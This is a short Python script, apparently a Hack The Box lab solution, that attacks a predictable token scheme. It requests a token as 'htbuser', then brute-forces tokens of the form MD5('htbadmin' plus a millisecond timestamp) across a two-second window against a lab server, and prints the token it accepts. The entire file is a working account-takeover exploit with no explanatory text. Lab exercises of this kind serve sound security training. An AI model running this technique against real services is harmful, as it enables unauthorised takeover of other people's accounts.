
import time
import datetime
import hashlib
import requests

url = "http://138.68.136.210:30019/question1/"

#submit=htbuser

data = {
	"submit":"htbuser"
}

t1 = time.time()*1000
r = requests.post(url,data=data)
t1 = int(t1)

#token=a&submit=check

for i in range(t1,t1+2000):
	hashvalue = 'htbadmin'+str(i)
	hashvalue = hashlib.md5(hashvalue.encode()).hexdigest()
	#print(hashvalue)
	data ={
		"token":hashvalue,
		"submit":"check"
	}
	r = requests.post(url,data=data)
	if not "Wrong token" in r.text:
		print(hashvalue)
